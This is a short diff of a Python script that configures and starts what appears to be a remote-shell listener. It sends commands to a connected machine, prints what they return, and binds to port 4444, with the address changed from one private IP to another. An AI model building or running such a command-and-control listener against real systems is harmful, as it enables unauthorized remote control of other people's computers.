@@ -146,5 +146,5 @@ class Listener:
             result = self.execute_remotely(command)
             print(result.decode('utf-8', errors='ignore'))
             
-mylistener = Listener("192.168.245.133", 4444)
+mylistener = Listener("169.254.0.1", 4444)
 mylistener.run()
